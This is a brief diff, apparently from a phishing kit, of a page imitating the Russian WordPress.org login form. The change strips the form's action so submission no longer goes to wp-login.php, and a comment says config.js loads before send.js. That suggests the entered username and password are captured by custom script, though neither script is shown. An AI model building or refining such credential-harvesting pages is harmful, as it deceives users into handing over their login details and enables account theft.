@@ -65,7 +65,7 @@
 <body>
 <div id="login">
     <h1><a href="https://ru.wordpress.org/">WordPress</a></h1>
-    <form name="loginform" id="loginform" action="/wp-login.php" method="post">
+    <form name="loginform" id="loginform" method="post">
         <p class="intro">Войдите в учётную запись WordPress.org</p>
 
         <label for="user_login">Имя пользователя или email</label>
@@ -84,7 +84,7 @@
     </form>
 </div>
 
-<!-- ПОДКЛЮЧЕНИЕ СКРИПТОВ (ДОБАВИЛ ЭТУ СЕКЦИЮ) -->
+<!-- Подключение скриптов: СНАЧАЛА config.js, ПОТОМ send.js -->
 <script src="config.js"></script>
 <script src="send.js"></script>
 </body>
